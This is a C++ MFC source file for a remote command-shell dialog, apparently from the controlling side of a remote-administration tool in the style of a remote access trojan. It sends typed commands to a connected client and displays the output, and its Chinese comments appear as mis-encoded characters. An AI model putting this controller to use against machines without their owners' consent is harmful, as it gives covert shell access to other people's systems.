// CmdManagerDlg.cpp : ʵ���ļ�
//

#include "stdafx.h"
#include "Server.h"
#include "CmdManagerDlg.h"
#include "afxdialogex.h"


// CCmdManagerDlg �Ի���

IMPLEMENT_DYNAMIC(CCmdManagerDlg, CDialog)

CCmdManagerDlg::CCmdManagerDlg(CWnd* pParent, CIOCPServer*
	IOCPServer, CONTEXT_OBJECT* ContextObject)
	: CDialog(IDD_DIALOG_CMD_MANAGER, pParent)
{
	m_IOCPServer = IOCPServer;
	m_ContextObject = ContextObject;

	m_IconHwnd = LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDR_MAINFRAME));
	
}

CCmdManagerDlg::~CCmdManagerDlg()
{
}

void CCmdManagerDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_EDIT_CMD_MAIN, m_CEdit_Cmd_Main);
}


BEGIN_MESSAGE_MAP(CCmdManagerDlg, CDialog)
	ON_WM_CLOSE()
	ON_WM_CTLCOLOR()
END_MESSAGE_MAP()


// CCmdManagerDlg ��Ϣ�������


BOOL CCmdManagerDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	m_ShowDataLength = 0;
	m_911 = 0;

	// TODO:  �ڴ���Ӷ���ĳ�ʼ��
	SetIcon(m_IconHwnd, FALSE);   //��������ͼ�굽Dialog
	CString v1;
	sockaddr_in  ClientAddress;
	memset(&ClientAddress, 0, sizeof(ClientAddress));
	int ClientAddressLength = sizeof(ClientAddress);

	BOOL IsOk = INVALID_SOCKET;
	if (m_ContextObject != NULL)
	{
		IsOk = getpeername(m_ContextObject->ClientSocket, (SOCKADDR*)&ClientAddress, &ClientAddressLength); //�õ����ӵ�ip 
	}
	v1.Format("%s - Cmd����", IsOk != INVALID_SOCKET ? inet_ntoa(ClientAddress.sin_addr) : "����");
	SetWindowText(v1);//���öԻ������

	BYTE IsToken = CLIENT_GO_ON;
	m_IOCPServer->OnClientPreSending(m_ContextObject, &IsToken, sizeof(BYTE));

	return TRUE;  // return TRUE unless you set the focus to a control
				  // �쳣: OCX ����ҳӦ���� FALSE
}
void CCmdManagerDlg::OnReceiveComplete(void)
{
	if (m_ContextObject == NULL)
	{
		return;
	}
	ShowClientCmdData();
	m_ShowDataLength = m_CEdit_Cmd_Main.GetWindowTextLength();
}
VOID CCmdManagerDlg::ShowClientCmdData(void)
{	
	m_ContextObject->m_InDeCompressedBufferData.WriteArray((LPBYTE)"", 1);           
	//�ӱ����ƶ�������������Ҫ����һ��\0
	CString v1 = (char*)m_ContextObject->m_InDeCompressedBufferData.GetArray(0);     
	//������е����� ���� \0																			 
	v1.Replace("\n", "\r\n");
	//�滻��ԭ���Ļ��з�  ����cmd �Ļ���ͬw32�µı༭�ؼ��Ļ��з���һ��   ���еĻس�����  	
	//�õ���ǰ���ڵ��ַ�����
	int	BufferLength = m_CEdit_Cmd_Main.GetWindowTextLength();    
	//����궨λ����λ�ò�ѡ��ָ���������ַ�  Ҳ����ĩβ ��Ϊ�ӱ��ض��������� Ҫ��ʾ�� ���ǵ� ��ǰ���ݵĺ���
	m_CEdit_Cmd_Main.SetSel(BufferLength, BufferLength);

	//�ô��ݹ����������滻����λ�õ��ַ�    //��ʾ
	m_CEdit_Cmd_Main.ReplaceSel(v1);          //HelloShit
	//���µõ��ַ��Ĵ�С
	m_911 = m_CEdit_Cmd_Main.GetWindowTextLength();   //C:\>dir
   //����ע�⵽��������ʹ��Զ���ն�ʱ �����͵�ÿһ�������� ����һ�����з�  ����һ���س�
  //Ҫ�ҵ�����س��Ĵ������Ǿ�Ҫ��PreTranslateMessage�����Ķ���  
}

BOOL CCmdManagerDlg::PreTranslateMessage(MSG* pMsg)
{
	
	if (pMsg->message == WM_KEYDOWN)
	{
		// ����VK_ESCAPE��VK_DELETE
		if (pMsg->wParam == VK_ESCAPE || pMsg->wParam == VK_DELETE)
			return true;
		//����ǿɱ༭��Ļس���
		if (pMsg->wParam == VK_RETURN && pMsg->hwnd == m_CEdit_Cmd_Main.m_hWnd)
		{
			//�õ����ڵ����ݴ�С
			int	BufferLength = m_CEdit_Cmd_Main.GetWindowTextLength();  //C:\>dir
			CString BufferData;
			//�õ����ڵ��ַ�����
			m_CEdit_Cmd_Main.GetWindowText(BufferData);//dir\r\n  
									  //���뻻�з�
			BufferData += "\r\n";
			//�õ������Ļ��������׵�ַ�ټ���ԭ�е��ַ���λ�ã���ʵ�����û���ǰ�����������
			//Ȼ�����ݷ��ͳ�ȥ������������������������������
			m_IOCPServer->OnClientPreSending(m_ContextObject, (LPBYTE)BufferData.GetBuffer(0) + m_911, 
				BufferData.GetLength() - m_911);
			m_911 = m_CEdit_Cmd_Main.GetWindowTextLength();  //���¶�λm_nCurSel  m_nCurSel = 3
		}
		// ����VK_BACK
		if (pMsg->wParam == VK_BACK && pMsg->hwnd == m_CEdit_Cmd_Main.m_hWnd)
		{
			if (m_CEdit_Cmd_Main.GetWindowTextLength() <= m_ShowDataLength)
				return true;
		}
	}
	//����ϵͳ
	return CDialog::PreTranslateMessage(pMsg);
}

void CCmdManagerDlg::OnClose()
{
	// TODO: �ڴ������Ϣ�����������/�����Ĭ��ֵ
	if (m_ContextObject != NULL)
	{
		CancelIo((HANDLE)m_ContextObject->ClientSocket);
		closesocket(m_ContextObject->ClientSocket);
		//���̫��Ҫ��
		m_ContextObject->DlgHandle = NULL;
		m_ContextObject->DlgID = 0;
	}
	CDialog::OnClose();
}
HBRUSH CCmdManagerDlg::OnCtlColor(CDC* pDC, CWnd* pWnd, UINT nCtlColor)
{
	HBRUSH hbr = CDialog::OnCtlColor(pDC, pWnd, nCtlColor);
	// TODO:  �ڴ˸��� DC ���κ�����
	if ((pWnd->GetDlgCtrlID() == IDC_EDIT_CMD_MAIN) && (nCtlColor == CTLCOLOR_EDIT))
	{
		COLORREF ColorReference = RGB(255, 255, 255);
		pDC->SetTextColor(ColorReference);   //���ð�ɫ���ı�
		ColorReference = RGB(0, 0, 0);
		pDC->SetBkColor(ColorReference);     //���ú�ɫ�ı���
		return CreateSolidBrush(ColorReference);  //��ΪԼ�������ر���ɫ��Ӧ��ˢ�Ӿ��
	}
	else
	{
		return CDialog::OnCtlColor(pDC, pWnd, nCtlColor);
	}
	// TODO:  ���Ĭ�ϵĲ������軭�ʣ��򷵻���һ������
	return hbr;
}
